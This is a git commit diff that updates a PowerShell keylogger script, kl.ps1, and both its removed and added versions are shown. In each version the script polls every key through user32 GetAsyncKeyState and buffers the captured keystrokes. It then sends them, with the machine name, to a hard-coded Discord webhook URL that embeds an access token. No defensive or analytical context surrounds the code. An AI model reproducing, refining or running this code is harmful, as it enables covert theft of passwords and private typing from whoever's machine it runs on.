449df262ab162f7edf3d874bbc96c669a18df23a
hamzza00 <hamzaouajoura@gmail.com>
2025-11-30 01:11:23 +0100

    Update kl.ps1

--- kl.ps1
+++ kl.ps1
@@ -1,48 +1,26 @@
 $webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'
 
-iwr $webhook -Method Post -Body (@{content="Keylogger propre lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+iwr $webhook -Method Post -Body (@{content="Keylogger natif lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
 
-Add-Type @'
+$code = @'
 using System;
 using System.Runtime.InteropServices;
-using System.Text;
 public class K {
-    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
-    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder lpChar, int cchBuff, uint wFlags);
-    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
+    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
 }
 '@
 
-$buffer = ''
-while($true){
-    Start-Sleep -m 30
-    $shift = ([K]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0
-    $caps = ([K]::GetAsyncKeyState(0x14) -band 1) -ne 0
+Add-Type $code
 
+$buf = ''
+while($true){
+    Start-Sleep -m 40
     for($i=8;$i -le 254;$i++){
         if([K]::GetAsyncKeyState($i) -eq -32767){
-            $sb = New-Object Text.StringBuilder
-            $ks = New-Object byte[] 256
-            if($shift){ $ks[0x10] = 0x80 }
-            if($caps){ $ks[0x14] = 0x01 }
-
-            $ret = [K]::ToUnicode($i, [K]::MapVirtualKey($i,0), $ks, $sb, 2, 0)
-            $char = $sb.ToString()
-
-            if($ret -eq -1){ continue }  # touche morte
-            if($char.Length -eq 0){
-                switch($i){
-                    8   {$char='[BACKSPACE]'; $buffer=$buffer.Substring(0,[Math]::Max(0,$buffer.Length-1))}
-                    13  {$char="[ENTER]`n"}
-                    32  {$char=' '}
-                    default {$char="[KEY$i]"}
-                }
-            }
-            if($i -ne 8){ $buffer += $char }
-
-            if($buffer.Length -ge 40){
-                iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
-                $buffer = ''
+            $buf += [char]$i
+            if($buf.Length -ge 25){
+                iwr $webhook -Method Post -Body (@{content=$buf}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
+                $buf = ''
             }
         }
     }
